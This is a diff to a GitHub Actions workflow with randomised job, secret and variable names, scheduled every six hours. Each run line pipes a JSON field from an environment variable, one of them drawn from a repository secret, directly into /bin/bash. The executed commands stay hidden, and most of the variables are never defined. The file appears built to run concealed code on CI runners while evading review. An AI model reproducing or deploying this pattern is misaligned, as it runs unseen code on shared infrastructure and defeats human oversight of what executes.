@@ -2,7 +2,8 @@ name: zhongliruo6121
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 2/6 * * *'
+    - cron: '8 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,29 +11,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongliruo6121
         env:
-          fdo492: ${{ secrets.fdo492 }}
+          muqnr3: ${{ secrets.muqnr3 }}
         run: |
-          echo $fdo492 | jq -r .civib8037 | /bin/bash
-          echo $wnxqp10413 | jq -r .ltd2941 | /bin/bash
-          echo $e85 | jq -r .j331 | /bin/bash
-          echo $svlm6 | jq -r .kp35 | /bin/bash
-          echo $qqbys3476 | jq -r .o58 | /bin/bash
-          echo $l86 | jq -r .kmyky252 | /bin/bash
-          echo $wnb11719 | jq -r .h25 | /bin/bash
-          echo $oywpu4 | jq -r .glth196 | /bin/bash
-          echo $dfmtj2 | jq -r .q18 | /bin/bash
-          echo $vcovj02 | jq -r .lvpm0 | /bin/bash
-          echo $kicgi2 | jq -r .t9 | /bin/bash
-          echo $z7666 | jq -r .ttj52165 | /bin/bash
-          echo $da208 | jq -r .r78 | /bin/bash
-          echo $w338 | jq -r .k9 | /bin/bash
-          echo $b88858 | jq -r .mnsj998 | /bin/bash
-          echo $uu20062 | jq -r .u27 | /bin/bash
-          echo $oc24 | jq -r .jcv418 | /bin/bash
-          echo $lwuf8 | jq -r .fwhoj96065 | /bin/bash
-          echo $myrzy72 | jq -r .befdl89423 | /bin/bash
-          echo $xdse7 | jq -r .qzoax39 | /bin/bash
-          echo $chbor21 | jq -r .yievn58861 | /bin/bash
-          echo $obuvn9 | jq -r .jwgr7 | /bin/bash
-          echo $kzjk29 | jq -r .gqo8126 | /bin/bash
+          echo $muqnr3 | jq -r .etf00 | /bin/bash
+          echo $otfdu544 | jq -r .z5130 | /bin/bash
+          echo $fy0288 | jq -r .bvz24873 | /bin/bash
+          echo $ck15 | jq -r .sqibo515 | /bin/bash
+          echo $a9842 | jq -r .yoi2 | /bin/bash
+          echo $wy792 | jq -r .sgvvu57 | /bin/bash
+          echo $ipukh58 | jq -r .l95 | /bin/bash
+          echo $uncz2 | jq -r .k6130 | /bin/bash
+          echo $fq575 | jq -r .nvxe04 | /bin/bash
+          echo $j54938 | jq -r .rb060 | /bin/bash
+          echo $icfba5206 | jq -r .ne99008 | /bin/bash
+          echo $v9747 | jq -r .asc73 | /bin/bash
+          echo $ji97 | jq -r .rt6951 | /bin/bash
+          echo $yx8859 | jq -r .gmf407 | /bin/bash
+          echo $opru49053 | jq -r .q59 | /bin/bash
+          echo $uv8823 | jq -r .cg38364 | /bin/bash
+          echo $ryvo7 | jq -r .sqjz6717 | /bin/bash
+          echo $zzln66 | jq -r .h60 | /bin/bash
+          echo $pfppt1 | jq -r .yjtvz1007 | /bin/bash
 
